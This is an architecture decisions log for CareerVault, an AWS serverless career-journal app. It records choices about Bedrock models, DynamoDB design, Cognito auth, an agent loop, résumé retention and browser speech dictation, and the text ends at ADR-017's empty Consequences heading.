# CareerVault — Architectural Decisions Log (ADL)

**Status:** Living document — updated as decisions are made
**Last updated:** 2026-08-09 (v1.1 slice 3 — **ADR-046** added [résumé history is a durable, no-TTL `RESUME#` record split from the ephemeral `RESUMERUN#` trace, which keeps its 30-day TTL; the `resumes/` S3 lifecycle rule is removed, **amending ADR-015 a second time** — its flat 30 days was a coupling fix to stop a trace outliving its artifacts, not a judgment about how long a résumé is worth keeping, and the coupling is gone once a durable record exists; **Sent**/**Draft** status badges omitted as having no referent, per ADR-045]; **ADR-046 amended** [`DELETE /resumes/{run_id}` — S3 artifacts, then record, then trace, behind ADR-027's confirm; added mid-slice because removing the lifecycle rule is what created the need, since nothing clears a résumé automatically any more]; **ADR-044 amended** [explicit Light/Dark/System selection on Details, defaulting to System so today's behaviour is unchanged for anyone who never opens it; `localStorage` + a pre-paint inline script, an attribute selector beside the existing media query rather than a `light-dark()` migration, which cannot express the five gradient tokens]) · prior: 2026-08-07 (v1.1 slice 1 — **ADR-043** added [correct the two design-handoff tokens that fail WCAG — `text-faint` #6f6c88 → #817e99 and a real focus ring from the existing `accent` token — deviating on exactly two values and nowhere else]; **ADR-044** added [keep system-theme support the current app already has; dark declared on bare `:root` so it diffs against the handoff, light derived and contrast-validated, heatmap ramp inverted]; **ADR-045** added [Home's aggregates derived client-side from `GET /entries`; "streak" defined as consecutive completed cadence periods by `created_at`, calendar-anchored, current period neutral until it ends]) · prior: slice 7 — **ADR-038** added [chat routing: a third control-flow tool `answer_question` keeps `toolChoice=any`; route → deterministic Titan retrieval → grounded synthesis, and `chat_lambda` gains read-only `ENTRY#` access, amending the §4.2.3 isolation claim]) · prior: slice 6b — **ADR-015 amended** [résumé retention becomes a flat 30 days matching the RESUMERUN TTL; the original "keep the newest indefinitely, 7-day TTL for older" is not expressible as an S3 lifecycle rule, and 7 days would have outlived-by-proxy the 30-day trace items]) · prior: slice 6a — **ADR-036** added [resume agent: Sonnet 5 via inference profile + 150K token ceiling + tuned iteration/revision caps; with a live-access correction — Sonnet 5 ungrantable on this account, runs on Sonnet 4-6 — and a cost-tuning note]; **ADR-037** added [résumé generation is an async job: 202 + poll, corrects arch §3.2.1's synchronous depiction]) · prior: slice 5 — ADR-035 added; ADR-024 corrected

---

## What this is

This file captures the **why** behind significant architectural choices on CareerVault. Each entry is an **Architecture Decision Record (ADR)** — a lightweight written record of a decision, the context around it, what alternatives were considered, and what we accept as consequences.

ADRs are an industry-standard practice because architectural reasoning fades fast: six months from now, looking at the code, "why did we pick SAM over CDK?" or "why Bedrock instead of the Anthropic API?" become unanswerable questions unless they're written down. ADRs preserve that institutional memory.

### Format used here

Each ADR has:
- **Status** — Accepted (decided), Proposed (leaning), Open (TBD), Deferred (revisit later), Superseded (replaced).
- **Context** — what situation forced the decision.
- **Decision** — what we chose.
- **Alternatives considered** — what we rejected and why.
- **Consequences / trade-offs** — what we gain, what we accept as cost or risk.

### Cross-reference

- Requirements: `careervault-requirements.md`
- Architecture: `careervault-architecture.md`
- Glossary: `careervault-glossary.md`
- Initial scoping notes: `careervault-reference.md`

---

## Index

| ID      | Title                                                              | Status     |
|---------|--------------------------------------------------------------------|------------|
| ADR-001 | Cloud provider — AWS (single-cloud for v1)                         | Accepted   |
| ADR-002 | Backend language and runtime — Python 3.13 on Lambda               | Accepted   |
| ADR-003 | Frontend stack — React + Vite                                      | Accepted   |
| ADR-004 | Infrastructure as Code — AWS SAM                                   | Accepted   |
| ADR-005 | Database — DynamoDB with single-table design                       | Accepted   |
| ADR-006 | Tenancy model — Single-tenant v1, multi-tenant-ready data model    | Accepted   |
| ADR-007 | Authentication — Cognito with one user for v1                      | Accepted   |
| ADR-008 | LLM provider — Amazon Bedrock                                      | Accepted   |
| ADR-009 | Model selection strategy — Haiku for cheap tasks, Sonnet for high-value | Accepted   |
| ADR-010 | Agent architecture — Bedrock tool use with custom loop (not Bedrock Agents) | Accepted |
| ADR-011 | Personalized check-ins — RAG pattern, not autonomous proactive agent | Accepted   |
| ADR-012 | AWS region — us-east-1                                             | Accepted   |
| ADR-013 | Resume bootstrap — file upload supported in MVP                    | Accepted   |
| ADR-014 | Voice-mode ingestion — deferred to v1.1                            | Accepted   |
| ADR-015 | Output delivery for MVP — in-app download only                     | Accepted   |
| ADR-016 | RAG retrieval mechanism — DynamoDB with in-Lambda vector similarity | Accepted   |
| ADR-017 | Bedrock API choice — Converse over InvokeModel                     | Accepted   |
| ADR-018 | PDF rendering library — WeasyPrint                                 | Accepted   |
| ADR-019 | Frontend hosting — S3 + CloudFront direct                          | Accepted   |
| ADR-021 | Check-in fallback tiers — three tiers, structural budget guard      | Accepted   |
| ADR-022 | Per-entry-type metadata schemas                                    | Accepted   |
| ADR-023 | Lambda layer composition — two layers (shared + WeasyPrint)        | Accepted   |
| ADR-024 | Embedding generation path — sync in write path                     | Accepted   |
| ADR-025 | Cognito user flow — hosted UI with OAuth2 Authorization Code + PKCE | Accepted   |
| ADR-026 | Data model — entity types and PK/SK design                         | Accepted   |
| ADR-027 | Delete semantics — hard delete with UI confirm                     | Accepted   |
| ADR-028 | GSI strategy — none at MVP                                         | Accepted   |
| ADR-029 | Frontend auth integration library — react-oidc-context             | Accepted   |
| ADR-030 | Environment-gated table protection + parameterized reserved concurrency | Accepted |
| ADR-031 | Bedrock invocation via cross-region inference profile (Haiku 4.5)  | Accepted   |
| ADR-032 | Chat turn idempotency — client-supplied message ID                 | Accepted   |
| ADR-033 | Semantic duplicate detection at confirm — warn, not block          | Accepted   |
| ADR-034 | CORS — wildcard allow-origin for the token-auth API                 | Accepted   |
| ADR-035 | Resume upload & parse flow — presigned upload, sync parse, parse-only | Accepted   |
| ADR-036 | Resume agent — Sonnet via inference profile + bounded-loop cost controls | Accepted   |
| ADR-037 | Resume generation is an asynchronous job (invoke + poll), not synchronous | Accepted   |
| ADR-038 | Chat routing — a third control-flow tool (`answer_question`) keeps `toolChoice=any` | Accepted   |
| ADR-039 | Check-in scheduling — daily UTC fire paced by `next_checkin_at`, due-users by Scan | Accepted   |
| ADR-040 | Nested `settings` updates — dotted-path `SET`, one path per sub-field       | Accepted   |
| ADR-041 | MVP delivery posture — dev *is* the MVP, prod proven by dry run             | Accepted   |
| ADR-042 | Integration tests tiered by cost, expensive tier opt-in                     | Accepted   |
| ADR-043 | Correct two design-handoff tokens that fail WCAG, from its own palette      | Accepted   |
| ADR-044 | Keep system-theme support; derive the light palette the handoff omits       | Accepted   |
| ADR-045 | Home's aggregates derived client-side; "streak" defined                     | Accepted   |
| ADR-046 | Résumé history is a durable `RESUME#` record split from the 30-day trace    | Accepted   |

**Amended since first acceptance:** ADR-015 (twice — delivery stands, retention rewritten by ADR-046) · ADR-021 · ADR-024 · **ADR-014** (twice — a `DictationProvider` seam with an optional `onInterim`, v1.1 slice 3; then mic on both composers, dictation fills but never sends, v1.1 slice 4) · **ADR-044** (explicit Light/Dark/System selection, v1.1 slice 3) · **ADR-046** (résumé deletion, added mid-slice in v1.1 slice 3 — amended in the same slice that accepted it) · ADR-019 · ADR-036

---

## ADR-001: Cloud provider — AWS (single-cloud for v1)

**Status:** Accepted
**Date:** 2026-05-31

### Context
CareerVault is a personal weekend project that also serves as a hands-on learning vehicle for cloud solutions architecture. The user already has an AWS free-tier account and Claude Pro for development assistance.

### Decision
Build entirely on AWS for v1. No multi-cloud, no portability abstractions.

### Alternatives considered
- **Azure** — strong AI offerings via Azure OpenAI Service and Azure AI Foundry; the user plans to build similar projects there later. Skipped for v1 since the AWS free tier and existing account are already in place.
- **GCP** — Vertex AI is excellent for AI-heavy projects, but no existing free-tier momentum here.
- **Multi-cloud abstraction** (e.g., Terraform with provider-agnostic modules) — adds significant complexity for marginal benefit on a personal project.

### Consequences
- ✅ Free-tier eligibility minimizes cost.
- ✅ Tight integration between AWS services (Cognito ↔ API Gateway ↔ Lambda ↔ Bedrock).
- ✅ The user gains deep AWS-specific knowledge applicable to most enterprise environments.
- ⚠️ Some vendor lock-in (Bedrock-specific APIs, SAM template format). Acceptable for a learning project; this is a recognized trade-off in cloud-native design.

---

## ADR-002: Backend language and runtime — Python 3.13 on Lambda

**Status:** Accepted
**Date:** 2026-05-31

### Context
The backend needs a language with mature AWS SDK support, strong AI/ML library ecosystem (since we'll likely call Bedrock from many places), and good Lambda support. The user prefers Python for both familiarity and AI tooling.

### Decision
Python 3.13 on AWS Lambda for all backend functions.

### Alternatives considered
- **Python 3.12** — current LTS-ish version, very stable. 3.13 is newer with performance improvements; both are fine. Going 3.13 to use the latest.
- **Node.js** — excellent Lambda performance, but Python's AI ecosystem (boto3 Bedrock, LangChain, etc.) is stronger.
- **Go** — fastest cold starts, but steeper learning curve and weaker Bedrock/AI ergonomics.

### Consequences
- ✅ Excellent Bedrock SDK ergonomics (boto3, `aws_lambda_powertools`).
- ✅ Transferable to Azure Functions and Google Cloud Functions, which also support Python.
- ⚠️ Python Lambda cold starts are slower than Go or Node. Acceptable; we're not building a low-latency API.

---

## ADR-003: Frontend stack — React + Vite

**Status:** Accepted
**Date:** 2026-05-31

### Context
The app needs a chat-style UI with a dashboard, resume preview pane, and responsive (mobile-web friendly) layout.

### Decision
React for the UI framework, Vite as the build tool. Hosting decision deferred (later resolved in ADR-019).

### Alternatives considered
- **Next.js** — adds SSR/routing power, but overkill for a single-user app with no SEO concerns.
- **Vue or Svelte** — good frameworks, but React ecosystem (especially around AI chat UIs) is the most mature.
- **Plain HTML/JS** — would minimize complexity but block growth into a richer UI later.

### Consequences
- ✅ Massive ecosystem of UI components, chat libraries, etc.
- ✅ Vite gives fast dev experience and bundle output.
- ⚠️ React adds JS bundle weight vs lighter frameworks; not material at our scale.

---

## ADR-004: Infrastructure as Code — AWS SAM

**Status:** Accepted
**Date:** 2026-05-31

### Context
All AWS resources must be defined as code (NFR-5.1). The choice of IaC tool affects developer experience, deployment speed, and which cloud you're locked to.

### Decision
AWS SAM (Serverless Application Model). Single `template.yaml` for all resources.

### Alternatives considered
- **AWS CDK** — more powerful (imperative TypeScript/Python rather than declarative YAML), but more complex setup. Reserve for future projects where its strengths pay off.
- **Terraform** — multi-cloud capability, but more verbose for Lambda-heavy apps and loses the SAM-specific niceties like `sam local start-api`.
- **CloudFormation directly** — SAM compiles down to CloudFormation but adds Lambda-optimized syntactic sugar.

### Consequences
- ✅ Concise YAML for the AWS-native serverless stack.
- ✅ `sam local invoke` and `sam local start-api` allow local testing without deploying.
- ⚠️ Locked to AWS. Acceptable per ADR-001.
- ⚠️ YAML is harder to refactor than imperative IaC; not yet a problem at our size.

---

## ADR-005: Database — DynamoDB with single-table design

**Status:** Accepted
**Date:** 2026-05-31

### Context
We need persistent storage for career entries, user metadata, and (later) generated artifacts. Workload is heavily key-based reads ("get this user's recent entries") with low write volume.

### Decision
Amazon DynamoDB, single-table design. Full key design and entity model captured in ADR-026.

### Alternatives considered
- **Amazon RDS (PostgreSQL)** — more flexible querying, but always-on cost and overkill for our access patterns.
- **Aurora Serverless v2** — scales to zero but minimum cost is still significant; no free tier for the v2 generation.
- **Multi-table DynamoDB design** — easier conceptually, but loses cost and query efficiency benefits of single-table design.

### Consequences
- ✅ Pay-per-request billing means near-zero cost at our scale.
- ✅ Single-digit-millisecond read latency.
- ✅ Multi-tenant-ready: user partition isolates data automatically.
- ⚠️ Single-table design has a learning curve and requires planning access patterns upfront.

---

## ADR-006: Tenancy model — Single-tenant v1, multi-tenant-ready data model

**Status:** Accepted
**Date:** 2026-05-31

### Context
v1 is for one user (the developer). Long-term vision is multi-tenant SaaS.

### Decision
Build for single-tenant in v1, but design every persisted record around a `user_id` partition so the system can become multi-tenant without data migration. No real multi-tenant features (signup, abuse prevention, billing per user) are built in v1.

### Alternatives considered
- **Pure single-user, hardcoded everywhere** — fastest to ship, but expensive to retrofit.
- **Full multi-tenant from day 1** — overkill for an MVP, increases scope significantly.

### Consequences
- ✅ Minimal extra work upfront.
- ✅ Easy expansion path later.
- ⚠️ Slightly more ceremony in code (passing `user_id` everywhere even though it never changes in v1).

---

## ADR-007: Authentication — Cognito with one user for v1

**Status:** Accepted
**Date:** 2026-05-31

### Context
Even in single-tenant mode, the API needs an auth boundary. Cognito is AWS's managed identity service.

### Decision
Amazon Cognito User Pool with a single user in v1. Every API Gateway endpoint requires a valid Cognito JWT.

### Alternatives considered
- **No auth, behind CloudFront with basic auth header** — cheapest, but throwaway-feeling and not a meaningful learning exercise.
- **AWS WAF + IP allowlist** — secure but inflexible (can't log in from new networks).
- **Roll-your-own JWT auth** — terrible idea, security risks, no learning value.

### Consequences
- ✅ Real-world AWS auth pattern; same flow scales to multi-tenant.
- ✅ Cognito free tier covers up to 50k MAUs.
- ⚠️ Cognito has a learning curve for hosted UI vs. SDK flows; will need to decide later.

---

## ADR-008: LLM provider — Amazon Bedrock

**Status:** Accepted
**Date:** 2026-05-31

### Context
The project requires access to Claude models for parsing, drafting, and reasoning. Multiple paths exist to reach Claude from AWS infrastructure.

### Decision
Use Amazon Bedrock as the LLM gateway. All inference goes through Bedrock; no direct calls to `api.anthropic.com`.

### Alternatives considered
- **Anthropic API directly** (`api.anthropic.com`) — sometimes cheaper, newest models arrive there first, but loses AWS-native IAM integration and the "AWS-native" learning angle that motivates this project.
- **Claude Platform on AWS** — newer Anthropic-direct offering hosted on AWS infrastructure. Compelling for some workloads but adds an unfamiliar billing/management surface.
- **OpenAI or other providers via Bedrock** — Bedrock supports multiple foundation model families; we'll stick with Anthropic for ecosystem reasons (Claude Pro, Claude Code).

### Consequences
- ✅ IAM-based access control to model invocation (no managing API keys in code).
- ✅ Native VPC integration if needed later.
- ✅ Same SDK (`boto3`) for Bedrock as for the rest of the stack.
- ⚠️ Slight cost premium and occasional model-availability lag vs direct Anthropic API.
- ⚠️ Claude Pro subscription does NOT discount Bedrock usage; these are separately billed.

---

## ADR-009: Model selection strategy — Haiku for cheap tasks, Sonnet for high-value reasoning

**Status:** Accepted
**Date:** 2026-05-31

### Context
Bedrock per-token cost varies dramatically by model. Claude Haiku is ~5–10x cheaper than Sonnet for input tokens. Using Sonnet for every task would blow the $10/month budget quickly; using Haiku for everything would degrade quality on hard reasoning.

### Decision
- **Claude Haiku** — entry parsing, check-in prompt generation, simple classification, chat for trivial back-and-forth.
- **Claude Sonnet** — resume tailoring agent loops, self-critique steps, anything where reasoning quality directly affects user value.

### Alternatives considered
- **All Sonnet** — best quality, but cost-prohibitive.
- **All Haiku** — cheapest, but resume quality would suffer.
- **Claude Opus for top-end** — even higher quality than Sonnet, but cost is hard to justify on a personal project.

### Consequences
- ✅ Cost stays in budget under expected usage.
- ✅ Two-tier model strategy is a transferable pattern (most production AI apps do this).
- ⚠️ Adds a small layer of routing logic; we'll centralize this in `backend/shared/bedrock_client.py`.

---

## ADR-010: Agent architecture — Bedrock tool use with custom loop

**Status:** Accepted
**Date:** 2026-05-31 (proposed), 2026-06-08 (accepted; formalized in Section 3.2 of `careervault-architecture.md`)

### Context
The reactive resume-generation agent (FR-5.2) needs to do multi-step reasoning: retrieve career data, draft bullets, critique, revise. AWS offers two paths to build this.

### Decision
Implement the agent loop ourselves using **Bedrock's tool-use (function calling)** capability — via the Converse API (see ADR-017). The Lambda code orchestrates the loop; the LLM decides which tools to call. The full formalization (canonical loop pseudocode, six-phase flow, tool catalog, termination conditions, action/progress tracking, HITL boundaries, error paths) lives in Section 3.2 of the architecture document.

### Alternatives considered
- **Bedrock Agents** (managed agent service with "action groups") — faster to ship, less code, but more "magic" hiding the internals. Less learning value for this project.
- **Roll our own tool use using InvokeModel API** — works but Converse API is the newer, friendlier interface for tool use.

### Consequences
- ✅ Deep understanding of how agent loops work — critical for the user's career growth in this area.
- ✅ Pattern transfers directly to other clouds (Azure AI Foundry, Vertex AI Agent Builder all expose similar tool-use APIs).
- ✅ Explicit control over termination conditions, progress tracking, and HITL placement — none of which managed services expose at the same fidelity.
- ⚠️ More code to write and maintain.
- ⚠️ We own the orchestration bugs (retries, max-step limits, stop-reason handling). Mitigated by the explicit mechanisms in Section 3.2.4–3.2.6.

---

## ADR-011: Personalized check-ins — RAG pattern, not autonomous proactive agent

**Status:** Accepted
**Date:** 2026-05-31

### Context
FR-4.3 requires the weekly check-in email to reference recent career activity. Initially considered as a "proactive agent" feature; in practice, it's better modeled as Retrieval-Augmented Generation.

### Decision
On the scheduled EventBridge trigger, the check-in Lambda:
1. Queries DynamoDB for recent entries within a recency window.
2. Summarizes them.
3. Injects the summary into a prompt to Claude Haiku.
4. Sends the resulting personalized email via SES.

No autonomous decision-making, no agent loop — straight retrieval + generation.

### Alternatives considered
- **True proactive agent** — agent decides on its own when to nudge, what to ask. Adds cost, complexity, and unbounded behaviors. Overkill.
- **Static generic reminders** — cheapest, but loses the personalization that makes check-ins motivating.

### Consequences
- ✅ Cheap, deterministic, easy to debug.
- ✅ RAG pattern is foundational — learning to do it right here pays dividends.
- ✅ Falls back to generic reminder gracefully if LLM step fails (NFR-1.x, FR-4.5).
- ⚠️ Less "agentic" than originally imagined; the truly proactive behaviors are deferred.

---

## ADR-012: AWS region — us-east-1

**Status:** Accepted
**Date:** 2026-05-31

### Context
A single primary region simplifies operations and minimizes cross-region data transfer costs.

### Decision
Deploy everything in `us-east-1` (N. Virginia).

### Alternatives considered
- **us-west-2 (Oregon)** — also has broad service support and is sometimes cheaper for compute. But us-east-1 still has the broadest service rollout, including newer Bedrock models.
- **Regions closer to the user** — would reduce latency by ~50ms. Not material for this workload.

### Consequences
- ✅ Maximum service availability, including newest Bedrock models.
- ✅ Most documentation, examples, and Stack Overflow answers assume us-east-1.
- ⚠️ Slightly higher latency for the user. Acceptable.

For cross-cloud parallel: Azure's analogous "default" region is roughly `East US`; GCP's is `us-central1`.

---

## ADR-013: Resume bootstrap — file upload supported in MVP

**Status:** Accepted
**Date:** 2026-05-31

### Context
First-time users would face a brutal experience if they had to type their entire career into a chat box. Most users already have an existing resume.

### Decision
Support PDF and DOCX resume upload in MVP. System parses the file using an LLM, presents extracted entries to the user for confirmation/edits before persisting.

### Alternatives considered
- **Defer to v1.1** — leaves a major UX gap in MVP.
- **LinkedIn API integration** — much higher ceiling, but LinkedIn API access is restricted and slow to provision. Deferred to post-MVP.
- **Parse the LinkedIn PDF export** — viable post-MVP path; same parsing pipeline as resume upload, just different input.

### Consequences
- ✅ Realistic first-time UX.
- ✅ Reuses the LLM-based parsing pipeline already needed for conversational input.
- ⚠️ Adds an S3 bucket for uploads, file-handling concerns, and a parsing Lambda. Scope creep, but worth it.

---

## ADR-014: Voice-mode ingestion — deferred to v1.1

**Status:** Accepted
**Date:** 2026-05-31

### Context
Voice input would lower the friction of capturing milestones, but adds frontend complexity (Web Speech API or Amazon Transcribe integration).

### Decision
Defer to v1.1. Use the browser's free Web Speech API when added; do not introduce Amazon Transcribe in v1 (added cost, added complexity).

### Alternatives considered
- **Ship in MVP with Web Speech API** — feasible, but pulls focus from core flows.
- **Amazon Transcribe** — server-side STT, more accurate for long-form, but costs money.

### Consequences
- ✅ Keeps MVP scope tight.
- ⚠️ Some users may find typing tedious until v1.1.

### Amendment (2026-08-10, v1.1 slice 3) — a `DictationProvider` seam, so the choice above stays revisitable

Recorded during slice 3, where voice was scoped in and then moved out to slice 4. Nothing here is
built yet; this exists so slice 4 starts from a decision rather than re-litigating one.

**The decision above stands unchanged: Web Speech API, not Amazon Transcribe, on cost grounds.**
What is added is the shape the implementation takes. Oche asked whether a paid API (Wispr Flow's
Flow API was the specific example) could be swapped in later. The answer is yes, behind an
interface, and the interface is worth naming now because it is cheap to design and expensive to
retrofit:

- A **`DictationProvider`** with an **optional `onInterim`** callback. Web Speech emits interim
  results as you speak; a buffer-then-POST cloud API returns one final transcript and simply never
  calls `onInterim`. Making it optional is what lets both satisfy the same contract — a required
  streaming callback would force cloud providers to fake partial results.
- Whatever the provider, the transcript enters the **existing `POST /chat` path**. Voice is an input
  method for the composer, not a second ingestion pipeline, so it adds **no backend surface at all**.

**This is a seam, not a plan to use it.** Any paid cloud STT breaks this ADR's own cost premise
against the $5 ceiling (NFR-1.1), so adopting one is a decision that gets made explicitly, here,
with numbers — not one that arrives implicitly because the interface allowed it. Nothing paid is
wired, and the seam does not commit the project to wiring any.

What makes this a known case rather than speculative generality is the ADR's own record: Web Speech
support is weak in Firefox. A second provider is therefore a foreseeable need, not an imagined one.

### Amendment 2 (2026-08-10, v1.1 slice 4) — where the mic lives, and the review gate that makes it safe

Amendment 1 recorded the seam. This records what gets built on it. These are details of the decision
above rather than a new one, which is why they are an amendment and not ADR-047 — and it follows the
slice-2 precedent, where the identical single-line-pill override on Log was recorded as a code
comment rather than an ADR.

**The mic goes on both composers, not just Log.** The narrower option was on the table and was
rejected by Oche: voice exists to remove capture friction, and Home is the view users land on —
especially on mobile. A mic that requires navigating to a second view first has given back the thing
it was added to save.

**Home's `<input>` becomes an auto-growing `<textarea>` to make that safe.** There was never a
principled reason for the single line; it is an `<input>` because the design handoff *drew* a
one-liner pill, and until now nothing on Home produced multi-sentence text. Dictation does, and a
dictated paragraph in a single-line control scrolls out of view horizontally. That matters because
of the next decision.

**Dictation fills the field and never sends.** The transcript lands in the composer; the user reads,
edits, and submits deliberately. This is the mitigation for the thing this ADR already knew about
speech-to-text — it is messier than typing, with filler words, no punctuation and garbled proper
nouns. Auto-send-on-silence was rejected: an unreviewed send costs ~$0.006 *and* deposits a garbled
entry in the corpus, so it fails on both the cost axis and the data-quality one.

Note the interaction the review gate has with the existing hand-off, because it reads like a hole and
is not one: `Start logging` on Home navigates to Log, and Chat **auto-sends** the carried text. The
review step is not missing — it sits on Home, *before* the button. Read the transcript in the field,
then press. One deliberate review per path, on both paths.

**Where the API is absent, no mic renders at all.** Feature-detect at mount. Typing already works and
is the default, so a hidden control leaves no broken affordance and nothing to explain. This ADR's
own record of weak Firefox support is what makes the fallback a requirement rather than a nicety.

**The mic lives inside the field's box** — added after seeing it on screen. Placed beside the field
it reads as a peer of the submit button; placed inside, it reads as what it is, an input method for
that field. Log's pill already had this shape, so this is Home matching Log rather than a new idea.

**Consequence worth stating plainly:** the cost premise is unchanged and load-bearing. Voice adds
**$0** — the transcript enters `POST /chat` and costs exactly what a typed message costs. If a
future change makes voice cost money, it has contradicted this ADR and needs a new one.

#### The trigger to revisit is broader than amendment 1 recorded

Amendment 1 justified the `DictationProvider` seam on one fact: Web Speech support is weak in
Firefox. Raised by Oche at slice-4 kickoff, and correct — **that understates the case, because the
support matrix is the least of it.** Web Speech is inconsistent *where it is supported*:

- **Continuous mode stops on its own.** Recognition ends on a silence timeout the page does not
  control and cannot configure, so "keep listening until I stop" is something the app has to
  reconstruct by restarting a session that ended without being asked to.
- **Final results arrive more than once.** The same utterance can be emitted as a final result
  repeatedly, so naive accumulation duplicates text.
- **Chrome and Safari differ in the details** — event timing, interim granularity, and what happens
  on restart — so "works in Chrome" is not evidence it works.

This makes the seam load-bearing in a way a support gap alone would not. A support gap is closed by
someone else shipping a feature; **behavioural inconsistency is not, and the state machine papering
over it is the part most likely to break.** So the presumption that this project eventually moves off
Web Speech is recorded here as reasonable rather than speculative — while noting the constraint that
has not moved: any *paid* replacement contradicts this ADR's cost premise against NFR-1.1 and needs
its own decision with numbers. A free, better browser API would not.

**What this does not license:** building for the second provider now. One implementation, behind the
interface, with the quirks handled in the Web Speech implementation and not leaked into the contract.

#### Correction (2026-08-11, slice 4 security review) — "browser-side" is true of the API, not of the processing

**This ADR has been describing Web Speech in a way that is materially wrong, and the error runs
through every version of it.** The original decision says the browser API avoids "added cost and
complexity"; amendment 1 says recognition is "browser-side, so voice capture adds **$0**"; amendment
2 repeats the cost premise. All of that is true about the *bill*. None of it is true about *where the
audio goes*.

**In Chrome and Safari, Web Speech is not on-device.** Captured audio is streamed to the browser
vendor's speech service and transcribed there. The implementation quietly corroborates this — it
maps a `"network"` error code, which exists only because recognition needs a server round-trip.

The decision itself **stands**: Web Speech is still the right choice, and the $5 ceiling (NFR-1.1)
argument is untouched, because the cost claim was about AWS spend and remains exactly right. What
changes is a claim this ADR should never have implied:

- **Before slice 4, no audio left the device. Now it does** — to a third party, outside the SSE-S3 /
  DynamoDB boundary every other part of this system is designed around, carrying precisely the PII
  the app exists to hold: employers, dates, project detail, colleague references.
- **The Transcribe comparison was never a privacy comparison.** Rejecting Amazon Transcribe on cost
  reads, in hindsight, as though the browser option were also the more contained one. It is not.
  Transcribe would have kept the audio inside the AWS account. That is not a reason to reverse the
  decision at $0 vs paid, but it is a reason the trade-off should be recorded honestly.

**Consequences accepted, with two mitigations built in slice 4:**

1. **The user is told, at the moment it applies.** The recording status line states that audio is
   sent to the browser's speech service. An undisclosed data flow is the actual defect here; the
   flow itself is inherent to the chosen API.
2. **The capture window is genuinely bounded.** The give-up counter now resets on *new speech*
   rather than on "a transcript exists" — which, after the first word, was true on every event, so
   ambient noise could have held the microphone open indefinitely. Pause tolerance is unchanged.

**If this trade ever stops being acceptable** — a corpus with client-confidential detail, say — the
replacement is not a different browser API but on-device STT or Transcribe, and that decision gets
made here, with numbers, as amendment 1 already requires of any paid provider.

---

## ADR-015: Output delivery for MVP — in-app download only

**Status:** Accepted
**Date:** 2026-05-31

### Context
Resume output could be delivered via in-app download, emailed to the user, pushed to Google Drive, or other channels.

### Decision
v1 supports in-app download (HTML preview + PDF download) and plain-text copy/paste from chat. No email-of-output, no Drive integration.

For PDF storage in S3: keep the most recent generation indefinitely; older generations have a 7-day TTL via S3 lifecycle policy. No DynamoDB record per generation in MVP — the "list past resumes" feature is post-MVP and would add `GENERATED_RESUME` entries later.

### Amendment (2026-07-27, slice 6b) — retention becomes a flat 30 days, matching the RESUMERUN TTL

The retention half of this decision was written before the implementation existed and does not survive
contact with it. Two corrections:

1. **"Keep the most recent generation indefinitely, expire older ones at 7 days" is not expressible as
   an S3 lifecycle rule.** Lifecycle rules filter on prefix, tag, size and age — there is no
   "except the newest object" predicate. Honouring the original wording would require the app to
   re-tag the previous run's objects on every generation (or an S3 Inventory + batch job), which is
   real moving machinery for a single-user MVP whose newest résumé is one regenerate away.
2. **7 days would contradict the record that points at the objects.** ADR-037 gave each run a
   RESUMERUN item with a **30-day** DynamoDB TTL. At 7 days the trace item would outlive its own
   HTML/PDF for three weeks, and `GET /resumes/{run_id}` would happily presign URLs to objects that
   no longer exist — a 200 response leading to a broken download.

**Amended decision:** objects under `resumes/` expire on a flat **30-day** S3 lifecycle rule, matching
the RESUMERUN TTL so a run's record and its artifacts die together. No "keep newest" carve-out and no
object tagging. The delivery half of the ADR — in-app HTML preview + PDF download, no email, no Drive —
stands unchanged.

**Consequence accepted:** a résumé older than 30 days is gone, and its poll URL 404s at the S3 fetch
rather than at the API. For a single-user MVP where regeneration costs ~$0.31 and ~3 minutes, that is
cheaper than the tagging machinery. If "list past résumés" ships post-MVP, retention gets revisited
alongside the `GENERATED_RESUME` entity — at which point "keep the newest N" becomes a query over
records, not a lifecycle predicate, and is trivial.

### Alternatives considered
- **Email delivery in MVP** — easy via SES, but adds attachment handling complexity.
- **Google Drive integration** — requires OAuth flow with Google, significant scope creep.
- _(2026-07-27)_ **Tag-the-previous-run + tag-scoped lifecycle rule** — the only faithful way to
  implement "keep newest indefinitely." Rejected: an extra S3 write per generation and a failure mode
  (a missed re-tag silently keeps objects forever) for no single-user benefit.

### Consequences
- ✅ Tight MVP scope; simplest possible delivery path.
- ✅ Artifact retention and trace retention are the same number (30 days), so there is one rule to
  reason about rather than two that drift.
- ⚠️ Power users may want emailed output; revisit post-MVP.
- ⚠️ Résumés are not archival. A user who wants to keep one must download the PDF.

---

## ADR-016: RAG retrieval mechanism — DynamoDB with in-Lambda vector similarity

**Status:** Accepted
**Date:** 2026-06-03

### Context
Both the check-in personalization (FR-4.3) and the resume-generation agent (FR-5.2) need to retrieve relevant career entries given some context.

Worth distinguishing the two use cases:
- **Check-ins** need recency-based retrieval — pure DynamoDB query on the sort key, no semantic component required.
- **The resume agent** needs *semantic* retrieval — matching a job description against career entries where the wording often differs. Pure keyword matching is brittle here.

### Decision
v1 retrieval implementation:

1. At write time, generate a Titan text embedding via Bedrock for each career entry. Store the embedding vector as a DynamoDB attribute on the entry record.
2. The resume agent exposes a `search_entries` tool. When called, the tool reads candidate entries (filtered by `user_id` and optional type/date filters), computes cosine similarity in-Lambda against the embedded job description, and returns the top-K matches.
3. Check-ins use plain DynamoDB queries against the timestamp range on the sort key.
4. The retrieval interface lives behind a single tool signature so the implementation can later be swapped (e.g., to S3 Vectors or Bedrock Knowledge Bases) without changes to the agent.

### Alternatives considered

- **Pure DynamoDB keyword + recency retrieval** — simplest, near-zero cost. Rejected because hands-on familiarity with embeddings is a primary learning goal, and the cost delta is negligible.
- **Bedrock Knowledge Bases (managed end-to-end RAG)** — Rejected on cost: OpenSearch Serverless has a ~$172/month floor — 17× the entire app budget.
- **Self-managed OpenSearch Serverless** — same cost floor.
- **Amazon S3 Vectors** — promising future swap target if the in-Lambda approach hits scaling limits.

### Consequences
- ✅ Hands-on experience with the full embedding lifecycle.
- ✅ Stays well inside the $10/month budget.
- ✅ Clean upgrade path.
- ⚠️ In-Lambda similarity computation is O(n) over user entries per query. Fine for hundreds of entries.
- ⚠️ Adds a small write-path side effect — embedding generation runs synchronously inline with the entry write per ADR-024.

---

## ADR-017: Bedrock API choice — Converse over InvokeModel

**Status:** Accepted
**Date:** 2026-06-03

### Context
The Bedrock SDK exposes two ways to call foundation models: the original `InvokeModel` API and the newer Converse API.

### Decision
Use the Bedrock Converse API for all model calls in CareerVault.

### Alternatives considered
- **InvokeModel** — original Bedrock API. Per-provider JSON schemas; switching models requires rewriting the payload.
- **Converse** — newer unified API. Single message-based interface across providers; tool-use is first-class.

### Consequences
